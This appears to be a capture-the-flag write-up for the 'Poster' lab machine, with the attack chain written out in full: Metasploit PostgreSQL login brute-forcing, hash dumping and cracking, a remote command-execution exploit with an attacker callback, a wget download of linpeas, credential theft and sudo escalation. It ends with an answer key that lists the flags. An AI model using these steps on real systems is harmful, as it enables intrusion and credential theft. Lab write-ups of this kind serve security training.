# Poster - Easy

```shell
nmap -T4 -p- -A -v 10.10.104.49

msfconsole -q

search postgresql

use auxiliary/scanner/postgres/postgres_login

options

set RHOSTS 10.10.104.49

run
#gives creds

search postgresql

use auxiliary/admin/postgres/postgres_sql

options

set PASSWORD password

set RHOSTS 10.10.104.49

run
#gives version of postgresql

search postgres hash

use auxiliary/scanner/postgres/postgres_hashdump

options

set PASSWORD password

set RHOSTS 10.10.104.49

run
#dumps hashes

#crack the hashes
vim hashes.txt

hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/kaonashi.txt

#in msfconsole
search postgres

use auxiliary/admin/postgres/postgres_readfile

options

set RHOSTS 10.10.104.49

set PASSWORD password

run
#prints /etc/passwd

search postgres command

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

options

set LHOST 10.14.31.212

set PASSWORD password

set RHOSTS 10.10.104.49

run
#we get command shell

whoami
#postgres

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls -la /home

ls -la /home/dark

cat /home/dark/credentials.txt
#we get creds for dark

#in another tab
ssh dark@10.10.104.49

cd /tmp

#get linpeas from attacker machine python server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

ls -la /var/www/html

cat /var/www/html/config.php
#we get alison creds

su alison

cd
#get user flag

sudo -l
#we can run all commands as all users

cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18
  * 5432 - postgresql - PostgreSQL DB

* We can begin enumeration of ```postgresql``` on port 5432 - we can search Metasploit for any related modules.

* We can use the module for postgresql login utility - configuring and running this module gives us creds.

* We can again search for a module which allows us to login into this service with creds.

* Running the required module gives us the version of the postgresql service on victim machine.

* Now, we need to check for modules which can dump hashes from the service.

* Running the required module dumps MD5 hashes for 6 users, we can crack these hashes using ```hashcat```

* We are able to crack passwords for 4 out of 6 users.

* We can use the Metasploit module to read files using authenticated users.

* Running the module prints out '/etc/passwd' - this includes the user 'dark'.

* Now, we need to search for modules related to postgresql that allow us command execution.

* Running the module with creds 'postgres:password', we are able to get a command shell session.

* We need to check for privesc now - we can check the users' home directories.

* From dark's home directory, we get creds - now we can log into SSH using this.

* Once we log into SSH, we can check for privesc using ```linpeas.sh```.

* We can check the web directory /var/www/html - this contains a config file.

* This file contains creds for alison - we can now login as alison.

* After getting user flag, we can check ```sudo -l``` - this shows we can run all commands as all users, so we can print root flag as sudo.

```markdown
1. What is the rdbms installed on the server? - postgresql

2. What port is the rdbms running on? - 5432

3. After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the module? - auxiliary/scanner/postgres/postgres_login

4. What are the credentials you found? - postgres:password

5. What is the full path of the module that allows you to execute commands with the proper user credentials? - auxiliary/admin/postgres/postgres_sql

6. What is the rdbms version installed on the server? - 9.5.21

7. What is the full path of the module that allows for dumping user hashes? - auxiliary/scanner/postgres/postgres_hashdump

8. How many user hashes does the module dump? - 6

9. What is the full path of the module that allows an authenticated user to view files of their choosing on the server? - auxiliary/admin/postgres/postgres_readfile

10. What is the full path of the module that allows arbitrary command execution with the proper user credentials? - exploit/multi/postgres/postgres_copy_from_program_cmd_exec

11. Compromise the machine and locate user.txt - THM{postgresql_fa1l_conf1gurat1on}

12. Escalate privileges and obtain root.txt - THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
